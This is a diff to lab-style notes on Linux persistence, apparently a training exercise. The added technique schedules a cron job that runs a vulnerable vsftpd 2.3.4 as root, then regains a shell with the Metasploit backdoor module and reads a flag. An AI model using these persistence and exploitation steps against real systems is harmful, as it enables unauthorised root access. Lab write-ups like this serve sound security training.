@@ -338,7 +338,7 @@ Once we execute this command we get the output in attacker's machine. In this wa
 
 ============================================================Completed================================================
 
-Technique: By scheduling "HTTP python server module" in cron
+Technique 6: By scheduling "HTTP python server module" in cron
 
 Procedure:
 
@@ -364,6 +364,67 @@ curl target_ip:8000/flag.txt
 So we can create Persistence or Maintain access on target by using "HTTP python Server module".
 
 =====================================completed==================================================
+
+Technique 7: T1505: Server Software Component : Server Software Component refers to adversaries leveraging other software/features present on the system to gain persistent access.
+
+Procedure:
+
+In this lab, we have to maintain access on victim's system because as per lab once we deleted "wait" file at the same time user's password changes automatically
+and ssh session will be terminated.
+
+So to create Persistence, we have to Check which command student user can execute as root.
+
+sudo -l
+
+Student user can execute “/usr/local/sbin/vsftpd” as root.
+
+Check the vsftpd version:
+
+vsftpd -v
+
+vsftpd version 2.3.4
+
+Now  Add a user cron job to start the vsftpd server which can later be leveraged to gain access on the target machine.
+
+echo "* * * * * sudo /usr/local/sbin/vsftpd" > cron
+crontab -i cron
+crontab -l
+
+Now we will Delete the wait file, once file deleted our SSH session will be terminated.
+
+rm wait
+
+Now our session is terminated so now we perform nmap scan and check whether port 21 is open:
+
+nmap -p- target_ip
+
+From above command output, we come to know port 21 is open on target machine thats mean vsftpd server has started.
+
+As we know vsftpd version 2.3.4 is running so we will search for exploit for this version.
+
+searchsploit vsftpd
+
+We found one metasploit module for this version
+
+msfconsole -q
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS target_ip
+exploit
+
+Once above module executed, we get the command shell
+
+id
+
+Now we search for a flag
+
+ls -l
+
+cat flag.txt
+
+In this way by running vsftpd service on target we will create Persistence because version of vsftpd is vulnerable of remote command execution.
+
+======================================================completed=======================================
 
 
 
